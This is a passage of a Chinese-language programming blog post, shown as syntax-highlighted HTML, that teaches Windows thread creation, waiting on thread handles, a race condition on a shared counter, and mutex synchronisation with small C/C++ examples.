class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">printH</span><span class="params">(<span class="type">void</span> *_x)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n = *((<span class="type">int</span> *)_x);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hello\n&quot;</span>);</span><br><span class="line"><span class="built_in">Sleep</span>(n * <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">printW</span><span class="params">(<span class="type">void</span> *_x)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n = *((<span class="type">int</span> *)_x);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;world!\n&quot;</span>);</span><br><span class="line"><span class="built_in">Sleep</span>(n * <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">printA</span><span class="params">(<span class="type">void</span> *_x)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n = *((<span class="type">int</span> *)_x);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ahahahaha!\n&quot;</span>);</span><br><span class="line"><span class="built_in">Sleep</span>(n * <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就是创建线程</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> x = <span class="number">3</span>, y = <span class="number">5</span>, z = <span class="number">7</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> xId, yId, zId;</span><br><span class="line">_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, printH, (<span class="type">void</span> *)&amp;x, <span class="number">0</span>, &amp;xId);</span><br><span class="line">_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, printW, (<span class="type">void</span> *)&amp;y, <span class="number">0</span>, &amp;yId);</span><br><span class="line">_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, printA, (<span class="type">void</span> *)&amp;z, <span class="number">0</span>, &amp;zId);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接这样写其实一次就运行完了，因为顺序执行之后return 0，主线程main结束了，线程就g了，所以要想办法阻塞主线程，最直接就是给主线程也来个延时。</p><img src="/2022/07/18/thread/003.png" class=""><p>线程就是可以同步进行，不过这个顺序似乎就第一次正常的，后面的好像全看心情。虽然函数设置的延时不一样，但是就算统一了延时效果也差不多。毕竟这个是系统自己处理的。</p><hr><p>可以看下进程号，应该说pid</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadFun</span><span class="params">(LPVOID p)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> imym = *((<span class="type">int</span> *)p);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;我是子线程，pid = %d, imym = %d\n&quot;</span>, <span class="built_in">GetCurrentThreadId</span>(), imym);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;main start!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">HANDLE hThread;</span><br><span class="line">DWORD dwThreadId;</span><br><span class="line"><span class="type">int</span> m = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadFun, &amp;m, <span class="number">0</span>, &amp;dwThreadId);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;我是主线程：pid = %d\n&quot;</span>, <span class="built_in">GetCurrentThreadId</span>());</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">20000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/18/thread/004.png" class=""><p>这个大致看看，现在可能用处不大。</p><hr><h2 id="简单多线程示例"><a href="#简单多线程示例" class="headerlink" title="简单多线程示例"></a>简单多线程示例</h2><p>内核对象</p><ol><li>内核对象通过API来创建，每个内核对象是一个数据结构，它对应一块内存，由操作系统内核分配，且只能由操作系统内核访问。在此数据结构中少数成员如安全描述符和使用计数是所有对象都有的，但是其他大多数成员都是不同类型的对象特有的。内核对象的数据结构只能由操作系统提供的API访问，应用程序在内存中不能访问。调用创建内核对象的函数后，该函数会返回一个句柄，它标识了所创建的对象，可以由进程的任何线程使用。</li></ol><h3 id="主线程和子线程的声明周期"><a href="#主线程和子线程的声明周期" class="headerlink" title="主线程和子线程的声明周期"></a>主线程和子线程的声明周期</h3><p>在最前面举例线程的时候，我们创建了三个子线程，但是子线程的执行顺序是不确定的。<br>而主线程main，我们当时还加了sleep延时去观察。<br>那么为什么要延时，当然是要给子线程运行的时间，比较子线程内分别也延时输出。<br>最重要的阻塞在<code>system(&quot;pause&quot;);</code>上。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadFun</span><span class="params">(LPVOID p)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> imym = *((<span class="type">int</span> *)p);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; imym; i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;子线程\n&quot;</span>);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">2000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;main start!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">HANDLE hThread;</span><br><span class="line">DWORD dwThreadId;</span><br><span class="line"><span class="type">int</span> m = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadFun, &amp;m, <span class="number">0</span>, &amp;dwThreadId);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/18/thread/005.png" class=""><p>可以看到，当我们没有按任意键的时候，子线程还能持续。</p><p>可当注释掉之后，他甚至都没进入到子线程就结束了。</p><img src="/2022/07/18/thread/006.png" class=""><p><strong>初步结论：main函数结束后，整个程序的进程终止，同时结束掉其所包含的所有线程</strong></p><p>但不论是通过<code>system(&quot;pause&quot;);</code>还是<code>Sleep</code>都不是很好的解决方法。</p><hr><h3 id="WaitForSingleObject"><a href="#WaitForSingleObject" class="headerlink" title="WaitForSingleObject"></a>WaitForSingleObject</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">WaitForSingleObject</span>(</span><br><span class="line">    _In_ HANDLE hHandle,<span class="comment">//表示一个内核对象的句柄</span></span><br><span class="line">    _In_ DWORD dwMilliseconds<span class="comment">//等待的时间</span></span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>简单解释就是等待一个内核对象变为已通知状态。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadFun</span><span class="params">(LPVOID p)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> imym = *((<span class="type">int</span> *)p);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; imym; i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;子线程\n&quot;</span>);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">2000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;main start!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">HANDLE hThread;</span><br><span class="line">DWORD dwThreadId;</span><br><span class="line"><span class="type">int</span> m = <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> wr;</span><br><span class="line"></span><br><span class="line">hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadFun, &amp;m, <span class="number">0</span>, &amp;dwThreadId);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((wr = <span class="built_in">WaitForSingleObject</span>(hThread, INFINITE)) == WAIT_FAILED)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;thread wait error\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/18/thread/007.png" class=""><p>可以看到他会先阻塞在waitforsingleobject那边，等待线程先进行完毕，然后再去执行system的函数。<br>与我们之前单纯用system阻塞有明显区别。</p><p>可以在if前后加个打印区分</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;main start!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">HANDLE hThread;</span><br><span class="line">DWORD dwThreadId;</span><br><span class="line"><span class="type">int</span> m = <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> wr;</span><br><span class="line"></span><br><span class="line">hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadFun, &amp;m, <span class="number">0</span>, &amp;dwThreadId);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;begin!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((wr = <span class="built_in">WaitForSingleObject</span>(hThread, INFINITE)) == WAIT_FAILED)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;thread wait error\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;end!\n&quot;</span>);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/18/thread/008.png" class=""><p>印证符合描述，他的确等待线程执行完毕。</p><p><code>WaitForSingleObject(hThread, INFINITE))</code>也就是线程阻塞在这里，等待线程结束后，才会顺便结束线程。<br>已通知状态，就是说线程执行完毕之后的状态。</p><hr><h3 id="WaitForMultipleObjects"><a href="#WaitForMultipleObjects" class="headerlink" title="WaitForMultipleObjects"></a>WaitForMultipleObjects</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">WaitForMultipleObjects</span>(</span><br><span class="line">    _In_ DWORD nCount,<span class="comment">//监测的句柄个数</span></span><br><span class="line">    _In_reads_(nCount) CONST HANDLE* lpHandles,<span class="comment">//监听的句柄组合</span></span><br><span class="line">    _In_ BOOL bWaitAll,<span class="comment">//TRUE等待所有内核对象发出信号，FALSE为任意一个内核对象发出信号</span></span><br><span class="line">    _In_ DWORD dwMilliseconds<span class="comment">//等待时间</span></span><br><span class="line">    );</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>#define INFINITE            0xFFFFFFFF  // Infinite timeout</code></p><p>那么当出现多个线程对象的时候，肯定不会说挨个等着。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NUM_THREAD 50</span></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> num = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">threadInc</span><span class="params">(<span class="type">void</span> *p)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">500000</span>; i++)&#123;</span><br><span class="line">num += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">threadDes</span><span class="params">(<span class="type">void</span> *p)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">500000</span>; i++)&#123;</span><br><span class="line">num -= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;main start!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">HANDLE tHandles[NUM_THREAD];</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;sizeof long long : %d\n&quot;</span>, <span class="built_in">sizeof</span>(<span class="type">long</span> <span class="type">long</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_THREAD; i++)&#123;<span class="comment">//NUM_THREAD=50，故两个线程各占一半</span></span><br><span class="line"><span class="keyword">if</span> (i % <span class="number">2</span>)&#123;</span><br><span class="line"><span class="comment">//奇数次执行+=1</span></span><br><span class="line">tHandles[i] = (HANDLE)_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, threadInc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//偶数次执行-=1</span></span><br><span class="line">tHandles[i] = (HANDLE)_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, threadDes, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">WaitForMultipleObjects</span>(NUM_THREAD, tHandles, TRUE, INFINITE);<span class="comment">//启动多个内核对象等待信号</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;result: %lld\n&quot;</span>, num);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/18/thread/009.png" class=""><img src="/2022/07/18/thread/010.png" class=""><img src="/2022/07/18/thread/011.png" class=""><p>跑的时候会发现值是不固定的。<br>常规思维中，全局变量，通过两个线程挨个调用，会觉得最后的值应该就是固定的。<br>但是线程是由cpu控制的，而全局变量还是存在与内存之上，于速度而言，肯定是cpu更快，所以当多个线程工作的时候，全局变量被线程取出使用，但是可能没等到改变的值传回全局变量，线程2就启动了，线程2改变的是线程1还没来得及放入的数据，如此反复，谁也不能保证最后到底算真正数学上的加减了几次。</p><p>虽然知道了这种特性，但是有的时候就是需要线程之间不要过分干预，就引出互斥对象</p><hr><h3 id="互斥对象"><a href="#互斥对象" class="headerlink" title="互斥对象"></a>互斥对象</h3><p>互斥对象同属于内核对象，它能保证线程拥有对单个资源的互斥访问权。</p><p>创建互斥对象使用：<code>CreatrMutex</code>.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">CreateMutexW</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPSECURITY_ATTRIBUTES lpMutexAttributes,<span class="comment">//指向安全属性</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ BOOL bInitialOwner,<span class="comment">//初始化互斥对象的所有者，TRUE立即拥有互斥体</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCWSTR lpName<span class="comment">//指向互斥对象名的指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> UNICODE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CreateMutex  CreateMutexW</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CreateMutex  CreateMutexA</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// !UNICODE</span></span></span><br></pre></td></tr></table></figure><p>额，可以看到好像会根据编码环境去做一些调整，不过问题不大，反正看得出来。然后这种线程创建成功返回的都是句柄。</p><p>请求互斥对象：<code>WaitForSingleObject</code>，线程必须主动请求共享对象的所有权才能获得所有权。<br>是否互斥对象的所有权：<code>ReleaseMutex</code>，线程访问共享资源结束后，线程要主动释放对互斥对象的所有权，使该对象处于已通知状态。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NUM_THREAD 50</span></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> num = <span class="number">0</span>;</span><br><span class="line">HANDLE hMutex;<span class="comment">//定义一个互斥量的句柄权限</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">threadInc</span><span class="params">(<span class="type">void</span> *p)</span></span>&#123;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hMutex, INFINITE);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">500000</span>; i++)&#123;</span><br><span class="line">num += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">ReleaseMutex</span>(hMutex);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">threadDes</span><span class="params">(<span class="type">void</span> *p)</span></span>&#123;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hMutex, INFINITE);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">500000</span>; i++)&#123;</span><br><span class="line">num -= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">ReleaseMutex</span>(hMutex);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;main start!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">HANDLE tHandles[NUM_THREAD];</span><br><span class="line"></span><br><span class="line"><span class="comment">//printf(&quot;sizeof long long : %d\n&quot;, sizeof(long long));</span></span><br><span class="line">hMutex = <span class="built_in">CreateMutex</span>(<span class="literal">NULL</span>, FALSE, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_THREAD; i++)&#123;<span class="comment">//NUM_THREAD=50，故两个线程各占一半</span></span><br><span class="line"><span class="keyword">if</span> (i % <span class="number">2</span>)&#123;</span><br><span class="line"><span class="comment">//奇数次执行+=1</span></span><br><span class="line">tHandles[i] = (HANDLE)_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, threadInc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//偶数次执行-=1</span></span><br><span class="line">tHandles[i] = (HANDLE)_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, threadDes, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">WaitForMultipleObjects</span>(NUM_THREAD, tHandles, TRUE, INFINITE);<span class="comment">//启动多个内核对象等待信号</span></span><br><span class="line"><span class="built_in">CloseHandle</span>(hMutex);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;result: %lld\n&quot;</span>, num);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span 